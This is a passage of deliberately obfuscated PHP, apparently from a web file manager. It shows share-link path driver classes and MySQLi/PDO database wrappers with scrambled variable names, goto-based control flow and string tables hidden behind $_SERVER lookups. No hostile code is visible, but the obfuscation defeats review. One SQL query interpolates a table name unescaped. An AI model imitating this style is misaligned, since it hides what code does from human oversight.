$D≠öâÜπüÎ = array($E¿√ﬁÿ†ÈÚ[1120], $E¿√ﬁÿ†ÈÚ[1121], $E¿√ﬁÿ†ÈÚ[1122], $E¿√ﬁÿ†ÈÚ[1123], $E¿√ﬁÿ†ÈÚ[486], $E¿√ﬁÿ†ÈÚ[488], $E¿√ﬁÿ†ÈÚ[1124], $E¿√ﬁÿ†ÈÚ[102], $E¿√ﬁÿ†ÈÚ[1125], $E¿√ﬁÿ†ÈÚ[1126]); if (in_array($A«¶¶Ïπó∞, $D≠öâÜπüÎ)) { $EÀàÉ”Ë∫Ê = $this->getPathOuter($EÀàÉ”Ë∫Ê); } return $EÀàÉ”Ë∫Ê; } public function copy($Dˆ‰≤µﬁ‹“, $e›¡Üäƒª, $cü£€ç√è = false) { return $this->copyMove($Dˆ‰≤µﬁ‹“, $e›¡Üäƒª, $cü£€ç√è, $_SERVER[¯èãÄπµ][486]); } public function move($cÎãÚ’‚Û¬, $Dﬁ†‚ªÜßì, $Fºò™Êƒé∂ = false) { return $this->copyMove($cÎãÚ’‚Û¬, $Dﬁ†‚ªÜßì, $Fºò™Êƒé∂, $_SERVER[¯èãÄπµ][488]); } private function copyMove($d‘˜ıΩû–ì, $d”ÕÇãæ«û, $cëÓ’‹Ê≤Ô, $BÍ¡øôµó®) { goto dôßø˘Ò±Ö; dôßø˘Ò±Ö: $bÊô≠¥∂⁄å =& $_SERVER[¯èãÄπµ]; $cı›ù£˘ëÂ = $d”ÕÇãæ«û; $aœ‘´í¿ µ = IO::driverMake($d”ÕÇãæ«û); goto fÜ˜ﬂøΩï∞; fÜ˜ﬂøΩï∞: if ($aœ‘´í¿ µ->pathParse[$bÊô≠¥∂⁄å[1000]]) { $d”ÕÇãæ«û = $aœ‘´í¿ µ->pathParse[$bÊô≠¥∂⁄å[1000]]; } else { $d”ÕÇãæ«û = $cı›ù£˘ëÂ; } $CÔ∞∫·ŸŸ˘ = IO::copyMove($d‘˜ıΩû–ì, $d”ÕÇãæ«û, $cëÓ’‹Ê≤Ô, $BÍ¡øôµó®); $CÔ∞∫·ŸŸ˘ = $this->getPathOuter($CÔ∞∫·ŸŸ˘); goto eﬁô§æ„ÉÑ; eﬁô§æ„ÉÑ: return $CÔ∞∫·ŸŸ˘; goto dÒæØüäŒë; dÒæØüäŒë: } public function pathFather($dÑ∞≠ìø»†) { return get_path_father($this->pathParse[$_SERVER[¯èãÄπµ][75]]); } public function iconvSystem($bíÊÿ‰∞û) { return $bíÊÿ‰∞û; } protected function infoParse($eºÀòÕÓöı) { $DêöúÊ›ﬁÉ =& $_SERVER[¯èãÄπµ]; $b‰Üº¯√ÑÃ = $this->pathParse[$DêöúÊ›ﬁÉ[435]][$DêöúÊ›ﬁÉ[1020]] . $this->pathParse[$DêöúÊ›ﬁÉ[1013]]; $Bå£æÚˆÑæ = IO::info($b‰Üº¯√ÑÃ); $Fıœ∞ÜÍØ‚ = $this->pathParse[$DêöúÊ›ﬁÉ[435]]; return Action($DêöúÊ›ﬁÉ[1118])->_shareItemeParse($Bå£æÚˆÑæ, $Fıœ∞ÜÍØ‚); } public function listAll($C¿è≠«”ïõ) { $B¡ËòÊÉêØ =& $_SERVER[¯èãÄπµ]; $CÑ≥¶±ò’ä = IO::listAll($C¿è≠«”ïõ); $d—¯ã‹ÿËü = $this->pathParse[$B¡ËòÊÉêØ[435]]; foreach ($CÑ≥¶±ò’ä as &$a¢êäö¶å®) { check_abort(); $a¢êäö¶å® = array_merge(IO::info($a¢êäö¶å®[$B¡ËòÊÉêØ[75]]), $a¢êäö¶å®); $a¢êäö¶å®[$B¡ËòÊÉêØ[387]] = Action($B¡ËòÊÉêØ[1118])->_shareItemeParse($a¢êäö¶å®, $d—¯ã‹ÿËü); } return $CÑ≥¶±ò’ä; } public function getPathOuter($a™‘◊≥≤ıß) { goto Cü°±ÔŒ≈⁄; c°ôëì≠ÈÍ: if (substr($d¢éŒ≠îº’, 0, strlen($EáùÉá¥ﬁ•)) != $EáùÉá¥ﬁ•) { return !1; } return $this->pathParse[$C…£îÍãΩî[1014]] . $C…£îÍãΩî[8] . ltrim($Eê¿∂ıª¬î, $C…£îÍãΩî[8]); goto A¨öŒì¢ûò; Cü°±ÔŒ≈⁄: $C…£îÍãΩî =& $_SERVER[¯èãÄπµ]; $A˜Ôç∞‚§’ = KodIO::parse($a™‘◊≥≤ıß); if ($A˜Ôç∞‚§’[$C…£îÍãΩî[29]] == KodIO::KOD_SHARE_ITEM) { return $A˜Ôç∞‚§’[$C…£îÍãΩî[75]]; } goto Bæ¿Î≠Ïíè; Bæ¿Î≠Ïíè: $d¢éŒ≠îº’ = KodIO::clear($a™‘◊≥≤ıß); $EáùÉá¥ﬁ• = KodIO::clear($this->pathParse[$C…£îÍãΩî[435]][$C…£îÍãΩî[1020]]); $Eê¿∂ıª¬î = substr($d¢éŒ≠îº’, strlen($EáùÉá¥ﬁ•)); goto c°ôëì≠ÈÍ; A¨öŒì¢ûò: } public function getType() { $EÑÊ≈ôÊ·Ï =& $_SERVER[¯èãÄπµ]; $b∆“áøÍıÇ = str_replace($EÑÊ≈ôÊ·Ï[71], $EÑÊ≈ôÊ·Ï[33], get_class($this)); return strtolower($b∆“áøÍıÇ); } public function isTypeObject($A‹È˜Ú’⁄¶) { return IO::isTypeObject($A‹È˜Ú’⁄¶); } public function info($CŒ£òöä∑Â) { return $this->infoParse($CŒ£òöä∑Â); } public function infoAuth($B°Ô∫ò©õ’) { return $this->infoParse($B°Ô∫ò©õ’); } public function infoWithChildren($dáﬁÉª¡ñÖ) { return $this->infoParse($dáﬁÉª¡ñÖ); } public function infoFull($Eßˆì¡ê¥«) { return $this->infoParse($Eßˆì¡ê¥«); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($DÓ«Ë∑≈Úƒ) { $this->pathParse = $DÓ«Ë∑≈Úƒ; } protected function infoParse($f◊«äÑıêÓ) { $E›‘È‹íÃ€ =& $_SERVER[¯èãÄπµ]; return Action($E›‘È‹íÃ€[1019])->sharePathInfo($this->pathParse[$E›‘È‹íÃ€[75]], !0); } public function listPath($e≈ íóÈî∆, $a∑Ö©—Ñﬁó = false) { $aåÇÑö‘úÍ =& $_SERVER[¯èãÄπµ]; $fêüÌõç·ƒ = IO::listPath($e≈ íóÈî∆, $a∑Ö©—Ñﬁó); foreach ($fêüÌõç·ƒ as $fèòŒ⁄Ï¨Ã => $d–Øâ≈©éÉ) { if (!in_array($fèòŒ⁄Ï¨Ã, array($aåÇÑö‘úÍ[73], $aåÇÑö‘úÍ[74]))) { continue; } foreach ($d–Øâ≈©éÉ as $d„ÖµÙ≥®« => $f±àø∏À¡‘) { $f±àø∏À¡‘ = Action($aåÇÑö‘úÍ[1127])->parsePathChildren($f±àø∏À¡‘, array($aåÇÑö‘úÍ[383] => $e≈ íóÈî∆)); $fêüÌõç·ƒ[$fèòŒ⁄Ï¨Ã][$d„ÖµÙ≥®«] = Action($aåÇÑö‘úÍ[1019])->shareItemInfo($f±àø∏À¡‘); } } return $fêüÌõç·ƒ; } public function listAll($aÇè∆áı†…) { $Eõ™≈≤·¶Û =& $_SERVER[¯èãÄπµ]; $eøà⁄Áõ€é = IO::listAll($aÇè∆áı†…); foreach ($eøà⁄Áõ€é as &$BÇı∫û¿≈®) { $BÇı∫û¿≈® = array_merge(IO::info($BÇı∫û¿≈®[$Eõ™≈≤·¶Û[75]]), $BÇı∫û¿≈®); $BÇı∫û¿≈®[$Eõ™≈≤·¶Û[387]] = Action($Eõ™≈≤·¶Û[1019])->shareItemInfo($BÇı∫û¿≈®); } return $eøà⁄Áõ€é; } } goto DÿﬂÂñ∏ÑÎ; Aó∑≈¨úµæ: class DbMysqli extends Db { public function __construct($b…√∂•øÂÌ = '') { $d⁄€≠ﬂœÆ =& $_SERVER[¯èãÄπµ]; if (!extension_loaded($d⁄€≠ﬂœÆ[730])) { think_exception(think_lang($d⁄€≠ﬂœÆ[10]) . $d⁄€≠ﬂœÆ[829]); } if (!empty($b…√∂•øÂÌ)) { $this->config = $b…√∂•øÂÌ; if (empty($this->config[$d⁄€≠ﬂœÆ[13]])) { $this->config[$d⁄€≠ﬂœÆ[13]] = $d⁄€≠ﬂœÆ[33]; } } } public function connect($E√∆ ≤”àΩ = '', $c÷ÎΩ‰Ò∫· = 0) { $AΩƒöª¢¿î =& $_SERVER[¯èãÄπµ]; if (!isset($this->linkID[$c÷ÎΩ‰Ò∫·])) { goto E¨ñëÇ›∞Ó; E¨ñëÇ›∞Ó: if (empty($E√∆ ≤”àΩ)) { $E√∆ ≤”àΩ = $this->config; } $this->linkID[$c÷ÎΩ‰Ò∫·] = new mysqli($E√∆ ≤”àΩ[$AΩƒöª¢¿î[803]], $E√∆ ≤”àΩ[$AΩƒöª¢¿î[805]], $E√∆ ≤”àΩ[$AΩƒöª¢¿î[806]], $E√∆ ≤”àΩ[$AΩƒöª¢¿î[17]], $E√∆ ≤”àΩ[$AΩƒöª¢¿î[804]] ? intval($E√∆ ≤”àΩ[$AΩƒöª¢¿î[804]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto F»Í£⁄ÚÙÃ; F»Í£⁄ÚÙÃ: $cﬁ˜ÇÎ™äÿ = $this->linkID[$c÷ÎΩ‰Ò∫·]->server_version; $this->linkID[$c÷ÎΩ‰Ò∫·]->query($AΩƒöª¢¿î[807] . think_config($AΩƒöª¢¿î[808]) . $AΩƒöª¢¿î[55]); if ($cﬁ˜ÇÎ™äÿ > $AΩƒöª¢¿î[809]) { $this->linkID[$c÷ÎΩ‰Ò∫·]->query($AΩƒöª¢¿î[810]); } goto BƒËÉ¯´‰Á; BƒËÉ¯´‰Á: $this->connected = !0; if (1 != think_config($AΩƒöª¢¿î[18])) { unset($this->config); } goto AèŒµÍ·¨î; AèŒµÍ·¨î: } return $this->linkID[$c÷ÎΩ‰Ò∫·]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($A—çÑ°äÛ≤) { goto fÑﬁÆë¡ÀÙ; A£⁄≈Ÿ€ä: think_status($DúÈËë•—¨[20]); $this->queryID = $this->_linkID->query($A—çÑ°äÛ≤); if ($this->_linkID->more_results()) { while (($f‰á«√±å = $this->_linkID->next_result()) != NULL) { $f‰á«√±å->free_result(); } } goto a∂Æ÷‘ﬁñ©; fÑﬁÆë¡ÀÙ: $DúÈËë•—¨ =& $_SERVER[¯èãÄπµ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fó§ﬁ∆íƒ€; fó§ﬁ∆íƒ€: $this->queryStr = $A—çÑ°äÛ≤; if ($this->queryID) { $this->free(); } think_action_status($DúÈËë•—¨[19], 1); goto A£⁄≈Ÿ€ä; a∂Æ÷‘ﬁñ©: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto eéì√Çéòú; eéì√Çéòú: } public function execute($FÈ”ﬂìÍ€â) { goto F€µ É¬íñ; aãì•üó¡Ÿ: think_status($a¬àâÿß©°[20]); $Báè”îÆ∂É = $this->_linkID->query($FÈ”ﬂìÍ€â); $this->debug(); goto Bπë…ﬁ¬ìÙ; d€®ù◊÷¿≥: $this->queryStr = $FÈ”ﬂìÍ€â; if ($this->queryID) { $this->free(); } think_action_status($a¬àâÿß©°[21], 1); goto aãì•üó¡Ÿ; F€µ É¬íñ: $a¬àâÿß©° =& $_SERVER[¯èãÄπµ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d€®ù◊÷¿≥; Bπë…ﬁ¬ìÙ: if (!1 === $Báè”îÆ∂É) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto FÎ“‡áˆÉ≠; FÎ“‡áˆÉ≠: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÔ–”·èàâ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aÔ–”·èàâ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $eı¬»‰÷«“ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$eı¬»‰÷«“) { $this->error(); return !1; } } return !0; } private function getAll() { $Cº≤«€«—‰ = array(); if ($this->numRows > 0) { for ($CóÑ≠•û∑ª = 0; $CóÑ≠•û∑ª < $this->numRows; $CóÑ≠•û∑ª++) { $Cº≤«€«—‰[$CóÑ≠•û∑ª] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Cº≤«€«—‰; } public function getFields($dù‡Ç≤ﬁ™) { $eä‰É¯ê€’ =& $_SERVER[¯èãÄπµ]; $A„≈£‘À€´ = $this->query($eä‰É¯ê€’[814] . $this->parseKey($dù‡Ç≤ﬁ™)); $DÏ∫ ¢®˜¯ = array(); if ($A„≈£‘À€´) { foreach ($A„≈£‘À€´ as $F·®îŸÁ™© => $c∞ú–Ñ◊˜Â) { $DÏ∫ ¢®˜¯[$c∞ú–Ñ◊˜Â[$eä‰É¯ê€’[27]]] = array($eä‰É¯ê€’[28] => $c∞ú–Ñ◊˜Â[$eä‰É¯ê€’[27]], $eä‰É¯ê€’[29] => $c∞ú–Ñ◊˜Â[$eä‰É¯ê€’[30]], $eä‰É¯ê€’[31] => (bool) ($c∞ú–Ñ◊˜Â[$eä‰É¯ê€’[32]] === $eä‰É¯ê€’[33]), $eä‰É¯ê€’[34] => $c∞ú–Ñ◊˜Â[$eä‰É¯ê€’[35]], $eä‰É¯ê€’[36] => strtolower($c∞ú–Ñ◊˜Â[$eä‰É¯ê€’[37]]) == $eä‰É¯ê€’[38], $eä‰É¯ê€’[39] => strtolower($c∞ú–Ñ◊˜Â[$eä‰É¯ê€’[40]]) == $eä‰É¯ê€’[41]); } } return $DÏ∫ ¢®˜¯; } public function getTables($d∞ıÖ‹≠å› = '') { $E≈Ü„åÆêÔ =& $_SERVER[¯èãÄπµ]; $DÖñÏΩ¿„… = !empty($d∞ıÖ‹≠å›) ? $E≈Ü„åÆêÔ[816] . $d∞ıÖ‹≠å› : $E≈Ü„åÆêÔ[817]; $B≤›œÀ≈ﬂà = $this->query($DÖñÏΩ¿„…); $eøæ∂Ç†€Ü = array(); if ($B≤›œÀ≈ﬂà) { foreach ($B≤›œÀ≈ﬂà as $E¡¢ë¡è–≥ => $c∂®ËùÖ°∫) { $eøæ∂Ç†€Ü[$E¡¢ë¡è–≥] = current($c∂®ËùÖ°∫); } } return $eøæ∂Ç†€Ü; } public function replace($D¯òê±ƒß†, $bª£é≥€Íí = array()) { $eÌÁ∂âªÉ« =& $_SERVER[¯èãÄπµ]; foreach ($D¯òê±ƒß† as $a”©äπ¡àå => $a⁄ë‘ıæ∏≤) { $fÏ¯ë˘ˆíø = $this->parseValue($a⁄ë‘ıæ∏≤); if (is_scalar($fÏ¯ë˘ˆíø)) { $C ÌØ√úŒü[] = $fÏ¯ë˘ˆíø; $e’¥œﬂõ◊ﬁ[] = $this->parseKey($a”©äπ¡àå); } } $dÎÈêÉ‡ßÉ = $eÌÁ∂âªÉ«[818] . $this->parseTable($bª£é≥€Íí[$eÌÁ∂âªÉ«[263]]) . $eÌÁ∂âªÉ«[819] . implode($eÌÁ∂âªÉ«[47], $e’¥œﬂõ◊ﬁ) . $eÌÁ∂âªÉ«[820] . implode($eÌÁ∂âªÉ«[47], $C ÌØ√úŒü) . $eÌÁ∂âªÉ«[821]; return $this->execute($dÎÈêÉ‡ßÉ); } public function insertAll($d¡¨àì„Ë◊, $FïË˜ç√‹À = array(), $b¶ä°ƒ¥« = false) { goto Bµ¯ìÕÃô¥; Bµ¯ìÕÃô¥: $d¿å”«àèì =& $_SERVER[¯èãÄπµ]; if (!is_array($d¡¨àì„Ë◊[0])) { return !1; } $a‹πÃˆπßÕ = array_keys($d¡¨àì„Ë◊[0]); goto A‹ΩÒˆù⁄é; A‹ΩÒˆù⁄é: $f≤éØóë¢æ = array(); foreach ($d¡¨àì„Ë◊ as $C‚ßçÇ…‚Á) { $b¨áÎﬂ∆‚» = array(); foreach ($C‚ßçÇ…‚Á as $CåáÑãæ‡ı => $bÜÇßÿŒìê) { $bÜÇßÿŒìê = $this->parseValue($bÜÇßÿŒìê); if (is_scalar($bÜÇßÿŒìê)) { $b¨áÎﬂ∆‚»[] = $bÜÇßÿŒìê; } } $f≤éØóë¢æ[] = $d¿å”«àèì[244] . implode($d¿å”«àèì[47], $b¨áÎﬂ∆‚») . $d¿å”«àèì[821]; } array_walk($a‹πÃˆπßÕ, array($this, $d¿å”«àèì[822])); goto Cêπ”Ó≤¨Ñ; Cêπ”Ó≤¨Ñ: $AÑ¯·œ˜°® = ($b¶ä°ƒ¥« ? $d¿å”«àèì[823] : $d¿å”«àèì[824]) . $d¿å”«àèì[825] . $this->parseTable($FïË˜ç√‹À[$d¿å”«àèì[263]]) . $d¿å”«àèì[819] . implode($d¿å”«àèì[47], $a‹πÃˆπßÕ) . $d¿å”«àèì[826] . implode($d¿å”«àèì[47], $f≤éØóë¢æ); return $this->execute($AÑ¯·œ˜°®); goto d√éÿ‡∫€•; d√éÿ‡∫€•: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Aã‚°ƒç≈† =& $_SERVER[¯èãÄπµ]; $this->error = $this->_linkID->errno . $Aã‚°ƒç≈†[4] . $this->_linkID->error; if ($Aã‚°ƒç≈†[33] != $this->queryStr) { $this->error .= LNG($Aã‚°ƒç≈†[45]) . $this->queryStr; } think_trace($this->error, $Aã‚°ƒç≈†[33], $Aã‚°ƒç≈†[46]); return $this->error; } public function escapeString($cÓç⁄ª‹Ïç) { if ($this->_linkID) { return $this->_linkID->real_escape_string($cÓç⁄ª‹Ïç); } else { return addslashes($cÓç⁄ª‹Ïç); } } public function parseKey(&$AßÚ’Œ„ëﬁ, $AÌØ™˘éèŸ = true) { $C˘ã∫ì€á¡ =& $_SERVER[¯èãÄπµ]; if ($AÌØ™˘éèŸ) { $AßÚ’Œ„ëﬁ = $this->parseKeyCheck($AßÚ’Œ„ëﬁ); } if ($AßÚ’Œ„ëﬁ != $C˘ã∫ì€á¡[172] && !preg_match($C˘ã∫ì€á¡[827], $AßÚ’Œ„ëﬁ)) { $AßÚ’Œ„ëﬁ = $C˘ã∫ì€á¡[828] . trim($AßÚ’Œ„ëﬁ, $C˘ã∫ì€á¡[828]) . $C˘ã∫ì€á¡[828]; } return $AßÚ’Œ„ëﬁ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($aÊ∫ùèùöò = '') { $aÃ≠ÓˆµàÑ =& $_SERVER[¯èãÄπµ]; if (!class_exists($aÃ≠ÓˆµàÑ[830])) { think_exception(think_lang($aÃ≠ÓˆµàÑ[10]) . $aÃ≠ÓˆµàÑ[831]); } if (!empty($aÊ∫ùèùöò)) { $this->config = $aÊ∫ùèùöò; if (empty($this->config[$aÃ≠ÓˆµàÑ[13]])) { $this->config[$aÃ≠ÓˆµàÑ[13]] = array(); } } } public function connect($b±Ü≤Ò”∫å = '', $Fãπ≤… Íˆ = 0) { $bÌÙÏÈ«∏î =& $_SERVER[¯èãÄπµ]; if (!isset($this->linkID[$Fãπ≤… Íˆ])) { goto DºâÑ‡çÏÀ; DºâÑ‡çÏÀ: if (empty($b±Ü≤Ò”∫å)) { $b±Ü≤Ò”∫å = $this->config; } if ($this->pconnect) { $b±Ü≤Ò”∫å[$bÌÙÏÈ«∏î[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Fãπ≤… Íˆ] = new PDO($b±Ü≤Ò”∫å[$bÌÙÏÈ«∏î[832]], $b±Ü≤Ò”∫å[$bÌÙÏÈ«∏î[805]], $b±Ü≤Ò”∫å[$bÌÙÏÈ«∏î[806]], $b±Ü≤Ò”∫å[$bÌÙÏÈ«∏î[13]]); } catch (PDOException $FëÒÕ’†å˜) { think_exception($FëÒÕ’†å˜->getMessage()); } goto A°çΩ’Ôâã; cÒ€®≤©àÏ: $this->linkID[$Fãπ≤… Íˆ]->exec($bÌÙÏÈ«∏î[841] . think_config($bÌÙÏÈ«∏î[808])); $this->connected = !0; if (1 != think_config($bÌÙÏÈ«∏î[18])) { unset($this->config); } goto aÎ≠¯ëãíÒ; A°çΩ’Ôâã: $this->dbType = $this->_getDsnType($b±Ü≤Ò”∫å[$bÌÙÏÈ«∏î[832]]); if (in_array($this->dbType, array($bÌÙÏÈ«∏î[833], $bÌÙÏÈ«∏î[834], $bÌÙÏÈ«∏î[835], $bÌÙÏÈ«∏î[836]))) { think_exception($bÌÙÏÈ«∏î[837] . $this->dbType . $bÌÙÏÈ«∏î[838] . $this->dbType . $bÌÙÏÈ«∏î[839]); } if (!$this->linkID[$Fãπ≤… Íˆ]) { think_exception($bÌÙÏÈ«∏î[840]); } goto cÒ€®≤©àÏ; aÎ≠¯ëãíÒ: } return $this->linkID[$Fãπ≤… Íˆ]; } public function free() { $this->PDOStatement = null; } public function query($F∆µàÑ˘Ñ¡, $EçÎÑ›Ù˜‘ = array()) { goto E¯˘–˘†éÉ; EòÓª≠ßåÀ: $this->queryStr = $F∆µàÑ˘Ñ¡; if (!empty($EçÎÑ›Ù˜‘)) { $this->queryStr .= $C‰Öøë«âÎ[842] . print_r($EçÎÑ›Ù˜‘, !0) . $C‰Öøë«âÎ[843]; } if (!empty($this->PDOStatement)) { $this->free(); } goto CÍÆùÙπÂä; FÜ±È®ñ„Ø: if (!1 === $fùÎÜÇàüË) { $this->error(); return !1; } else { return $this->getAll(); } goto b’…´ΩÙ”Ê; eÏ‘€öá’ı: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $fùÎÜÇàüË = $this->PDOStatement->execute($EçÎÑ›Ù˜‘); $this->debug(); goto FÜ±È®ñ„Ø; E¯˘–˘†éÉ: $C‰Öøë«âÎ =& $_SERVER[¯èãÄπµ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EòÓª≠ßåÀ; CÍÆùÙπÂä: think_action_status($C‰Öøë«âÎ[19], 1); think_status($C‰Öøë«âÎ[20]); $this->PDOStatement = $this->_linkID->prepare($F∆µàÑ˘Ñ¡); goto eÏ‘€öá’ı; b’…´ΩÙ”Ê: } public function execute($D¶ˆË˜—ïÏ, $f≤∞‚ÀÏ◊∫ = array()) { goto d¬¿éôÉïÔ; A’íìÉÜô„: $this->queryStr = $D¶ˆË˜—ïÏ; if (!empty($f≤∞‚ÀÏ◊∫)) { $this->queryStr .= $E§’≈‚è Ï[842] . print_r($f≤∞‚ÀÏ◊∫, !0) . $E§’≈‚è Ï[843]; } $d‡„Ï‘ŒÌæ = !1; goto B∑ÇëÎ°®ì; FÏÜ™Ù‰‰‹: $aﬁ≠€Ø«ë  = $this->PDOStatement->execute($f≤∞‚ÀÏ◊∫); $this->debug(); if (!1 === $aﬁ≠€Ø«ë ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($d‡„Ï‘ŒÌæ || preg_match($E§’≈‚è Ï[848], $D¶ˆË˜—ïÏ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto eöπÕ…Ì›Œ; d¬¿éôÉïÔ: $E§’≈‚è Ï =& $_SERVER[¯èãÄπµ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A’íìÉÜô„; B∑ÇëÎ°®ì: if ($this->dbType == $E§’≈‚è Ï[836]) { if (preg_match($E§’≈‚è Ï[844], $this->queryStr, $B¬ü≥≥∑€ì)) { $this->table = think_config($E§’≈‚è Ï[845]) . str_ireplace(think_config($E§’≈‚è Ï[846]), $E§’≈‚è Ï[357], $B¬ü≥≥∑€ì[2]); $d‡„Ï‘ŒÌæ = (bool) $this->query($E§’≈‚è Ï[847] . strtoupper($this->table) . $E§’≈‚è Ï[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($E§’≈‚è Ï[21], 1); goto cã‹ûˆèôÖ; cã‹ûˆèôÖ: think_status($E§’≈‚è Ï[20]); $this->PDOStatement = $this->_linkID->prepare($D¶ˆË˜—ïÏ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto FÏÜ™Ù‰‰‹; eöπÕ…Ì›Œ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CÂ∫åàà”≠ = $this->_linkID->commit(); $this->transTimes = 0; if (!$CÂ∫åàà”≠) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FÃ∞ïºùô‡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FÃ∞ïºùô‡) { $this->error(); return !1; } } return !0; } private function getAll() { $a∏˜›±»Ë§ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($a∏˜›±»Ë§); return $a∏˜›±»Ë§; } public function getFields($c∆å‹ßçåµ) { goto eâ›ƒÇé˜ó; dôé¥äﬂÇã: return $Féßœ¥ÑŸÿ; goto FÀŸ÷£¥ÇŒ; eâ›ƒÇé˜ó: $fÍ€∑èÚªØ =& $_SERVER[¯èãÄπµ]; $this->initConnect(!0); if (think_config($fÍ€∑èÚªØ[849])) { $E†á©ΩπÙ≠ = str_replace($fÍ€∑èÚªØ[850], $c∆å‹ßçåµ, think_config($fÍ€∑èÚªØ[849])); } else { switch ($this->dbType) { case $fÍ€∑èÚªØ[833]: case $fÍ€∑èÚªØ[851]: $E†á©ΩπÙ≠ = "\x53\105\114\x45\103\124\x20\x20\40\x63\x6f\x6c\x75\x6d\156\x5f\x6e\141\x6d\x65\40\141\163\x20\47\116\141\155\x65\x27\x2c\40\x20\x20\144\141\164\141\x5f\164\x79\160\x65\40\x61\163\40\x27\x54\x79\x70\x65\x27\54\40\40\40\143\x6f\154\x75\x6d\x6e\x5f\x64\145\x66\x61\x75\154\164\40\x61\x73\x20\x27\x44\x65\146\x61\x75\154\164\47\54\x20\40\x20\151\163\x5f\x6e\x75\x6c\x6c\x61\x62\154\x65\x20\141\163\x20\x27\116\x75\x6c\x6c\47\xa\x9\11\106\x52\x4f\x4d\x9\x69\156\146\x6f\162\x6d\141\x74\151\157\x6e\137\x73\x63\150\145\155\141\x2e\164\141\142\154\x65\x73\40\101\x53\x20\x74\xa\x9\11\x4a\x4f\111\116\11\151\x6e\x66\x6f\162\x6d\141\x74\x69\157\x6e\x5f\163\x63\x68\x65\155\x61\56\143\x6f\x6c\165\155\x6e\x73\40\101\123\40\x63\xa\x9\11\117\116\x20\x20\x74\x2e\164\x61\x62\x6c\x65\x5f\143\x61\x74\x61\154\x6f\147\x20\x3d\x20\x63\56\x74\x61\142\154\145\137\143\x61\164\141\154\157\x67\xa\x9\11\x41\x4e\104\x20\x74\56\x74\x61\x62\x6c\145\x5f\x73\x63\150\145\155\x61\x20\x3d\x20\x63\56\x74\141\142\x6c\x65\x5f\x73\x63\x68\145\155\141\xa\11\11\x41\116\104\40\x74\56\x74\x61\x62\x6c\x65\137\156\x61\155\145\40\x3d\x20\143\56\x74\x61\142\x6c\x65\x5f\x6e\141\x6d\145\xa\11\x9\x57\110\x45\122\105\40\x20\40\x74\x2e\164\141\x62\154\145\137\156\x61\x6d\145\x20\x3d\x20\47{$c∆å‹ßçåµ}\47"; break; case $fÍ€∑èÚªØ[852]: $E†á©ΩπÙ≠ = $fÍ€∑èÚªØ[853] . $c∆å‹ßçåµ . $fÍ€∑èÚªØ[854]; break; case $fÍ€∑èÚªØ[834]: case $fÍ€∑èÚªØ[836]: $E†á©ΩπÙ≠ = $fÍ€∑èÚªØ[855] . $fÍ€∑èÚªØ[856] . $fÍ€∑èÚªØ[857] . strtoupper($c∆å‹ßçåµ) . $fÍ€∑èÚªØ[858] . strtoupper($c∆å‹ßçåµ) . $fÍ€∑èÚªØ[859]; break; case $fÍ€∑èÚªØ[860]: $E†á©ΩπÙ≠ = $fÍ€∑èÚªØ[861] . $c∆å‹ßçåµ . $fÍ€∑èÚªØ[862]; break; case $fÍ€∑èÚªØ[835]: break; case $fÍ€∑èÚªØ[863]: default: $E†á©ΩπÙ≠ = $fÍ€∑èÚªØ[864] . ($this->dbType == $fÍ€∑èÚªØ[863] ? "\140{$c∆å‹ßçåµ}\140" : $c∆å‹ßçåµ); } } goto AπõΩÆ≠ø‹; AπõΩÆ≠ø‹: $DäØ÷ÁÓ™ü = $this->query($E†á©ΩπÙ≠); $Féßœ¥ÑŸÿ = array(); if ($DäØ÷ÁÓ™ü) { foreach ($DäØ÷ÁÓ™ü as $c∆ÁëÊ»üà => $a¬Ëô≤ôâ§) { $a¬Ëô≤ôâ§ = array_change_key_case($a¬Ëô≤ôâ§); $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[28]] = isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[28]]) ? $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[28]] : $fÍ€∑èÚªØ[357]; $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[29]] = isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[29]]) ? $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[29]] : $fÍ€∑èÚªØ[357]; $e¡Ô‡Í èÉ = isset($a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[257]]) ? $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[257]] : $a¬Ëô≤ôâ§[$fÍ€∑èÚªØ[28]]; $Féßœ¥ÑŸÿ[$e¡Ô‡Í èÉ] = array($fÍ€∑èÚªØ[28] => $e¡Ô‡Í 